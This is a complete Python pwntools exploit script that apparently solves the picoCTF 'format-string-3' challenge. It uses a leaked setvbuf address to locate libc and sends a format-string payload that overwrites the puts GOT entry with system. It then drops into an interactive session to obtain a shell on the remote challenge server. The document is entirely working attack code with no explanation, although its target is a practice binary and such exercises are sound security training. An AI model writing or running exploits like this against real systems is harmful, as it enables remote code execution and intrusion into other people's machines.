from pwn import *

r = remote("rhea.picoctf.net" , 52952)
# r = process('./format-string-3')

elf = ELF('./format-string-3')
libc = ELF('./libc.so.6')

context.arch = elf.arch

offset = 38

r.recvuntil(b"Okay I'll be nice. Here's the address of setvbuf in libc: ")
base = int(r.recvline().strip(),16) - libc.symbols['setvbuf']

puts_got = elf.got['puts']
system_addr = libc.symbols['system'] + base

print(f"[*] puts GOT address: {hex(puts_got)}")
print(f"[*] system address: {hex(system_addr)}")

payload = fmtstr_payload(offset , {puts_got : system_addr})

r.sendline(payload)

r.interactive()
